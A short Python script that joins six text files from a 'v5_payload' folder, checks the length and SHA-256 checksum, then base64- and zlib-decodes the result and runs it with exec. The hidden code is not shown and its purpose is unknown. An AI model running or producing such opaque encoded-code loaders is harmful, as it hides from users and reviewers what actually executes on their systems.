from pathlib import Path
import base64
import hashlib
import zlib

PARTS = Path(__file__).with_name('v5_payload')
payload = ''.join((PARTS / f'part{i}.txt').read_text(encoding='utf-8').strip() for i in range(6))
if len(payload) != 10368:
    raise SystemExit(f'Android v5 payload length mismatch: {len(payload)}')
if hashlib.sha256(payload.encode('ascii')).hexdigest() != 'f42292e11d237fe8003fadc97969444dc97a5cbdc8af5859af9ab708ba3f11c9':
    raise SystemExit('Android v5 payload checksum mismatch')
source = zlib.decompress(base64.b64decode(payload)).decode('utf-8')
exec(compile(source, __file__, 'exec'))
